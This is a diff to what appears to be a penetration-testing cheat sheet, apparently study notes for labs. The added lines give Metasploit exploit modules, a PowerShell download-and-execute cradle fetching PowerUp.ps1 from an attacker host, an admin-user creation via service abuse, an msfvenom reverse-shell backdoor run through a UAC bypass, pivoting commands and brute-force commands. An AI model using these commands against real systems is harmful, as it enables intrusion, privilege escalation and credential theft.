@@ -58,6 +58,7 @@
     - exploit/multi/misc/java_rmi_server ==> Result in a shell
     - auxiliary/scanner/mysql/mysql_authbypass_hashdump ==> dump mysql password hashes
     - exploit/windows/http/badblue_passthru for badblue 2.7 ==> Result in a shell
+    - exploit/windows/http/rejetto_hfs_exec for hfs 2.3  ==> Result in a shell
 
 ### 3.Post Exploitation
 
@@ -65,6 +66,7 @@
     run winenum
     run arp_scanner –r TargetNetworkSubnet
     run post/multi/gather/filezilla_client_cred
+    run post/windows/gather/enum_applications
 
 #### 3.1 Privilege Escalation
 
@@ -73,6 +75,8 @@
     getsystem
     post/windows/gather/win_privs        : Check if UAC enabled
     exploit/windows/local/bypassuac      : Local exploit to bypass UAC
+    
+    run post/multi/recon/local_exploit_suggester
     
     - Method 1 : Search Local Exploit using MSF
     - Method 2 : Impersonate privileged users
@@ -87,9 +91,21 @@
         For each service check if user can write in the service Path 
               ==> icacls “Path”
     
-    - Using powerUp.ps1 script
+    - Using powerUp.ps1 script in https://powersploit.readthedocs.io/en/latest/Privesc/
+        - Import the script to the Victim in Powershell ==> iex (New-Object Net.WebClient).DownloadString('http://HackeIP/PowerUp.ps1')
+        - Run Invoke-AllChecks
+        - Take note of the AbuseFunction (example : PriviligedService)
+        - Use the PriviligedService to run any OS Command for example create new Admin user : Invoke-ServiceAbuse -Name PriviligedService  -UserName testUser -Password password_123 -LocalGroup "Administrators"
+
+##### 3.1.3 
+    - Using the UACMe framework
+        - Generate backdoor : msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.2 LPORT=4444 -f exe > 'backdoor.exe'
+        - Upload both backdoor.exe and UACMe executable
+        - Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
+    - 
         
 ##### 3.1.3 Specific Linux
+    use exploit/multi/mysql/mysql_udf_payload if mysql running as root and we have the password
 
 #### 3.3 Pivoting
     From MSF Console : route add 192.168.4.0 (subnet) 255.255.255.0(mask) 6(session)
@@ -97,12 +113,17 @@
     
     portfarwarding (meterpreter) ==>  portfwd add -l LocalPort -p ServicePort -r victimeIP (ex: portfwd add -l 1234 -p 80 -r 10.0.17.12)
     portfwd list    ==> This meterpreter command display current portforwarding
-
+    ssh Port Forwarding ==>
+        - ssh -4 -L 8000:127.0.0.1:3306 user@target    : Forward traffic going to specific port to another port on the Victim
+        - ssh -D 9090 user@target                      : Open socks proxy listning on 9090
+        
 ### 4.Bruteforcing
 
-    hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt TARGET smb
-
-
+    Brutefore Using Hydra     : hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt TARGET smb
+    RDP from kali             : xfreerdp /u:guest_1 /p:guestpwd /v:Target
+    SSH Using MSF             : auxiliary/scanner/ssh/ssh_login
+    Brute Force MySQL         : use auxiliary/scanner/mysql/mysql_login
+    
 ### 5.Sniffing
 
 #### 5.1 MiTM between vtcim1 & victm2 using arp poisonning
